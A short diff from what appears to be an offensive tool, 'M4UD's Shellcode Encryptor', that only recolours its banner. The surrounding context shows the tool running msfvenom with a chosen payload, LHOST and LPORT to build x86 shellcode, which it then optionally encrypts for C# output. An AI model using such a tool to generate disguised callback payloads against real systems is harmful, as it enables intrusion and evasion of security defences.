@@ -62,7 +62,7 @@ def main():
 
     msfvenom_output = subprocess.run(['msfvenom', '-p', args.payload, '-f', args.format,'-v','shellcode', '-a', 'x86', 'LHOST='+args.lhost, 'LPORT='+args.lport], capture_output=True)
     shellcode = msfvenom_output.stdout.decode().strip(" ")
-    print("\r\n( M4UD's Shellcode Encryptor -\_(- -)_/-  )\r\n")
+    print("\r\n\033[1;32;40m( M4UD's Shellcode Encryptor \033[1;33;40m-\_(- -)_/-\033[1;32;40m  )\033[m\r\n")
 
 
     if args.encryption != None and args.format == 'csharp':
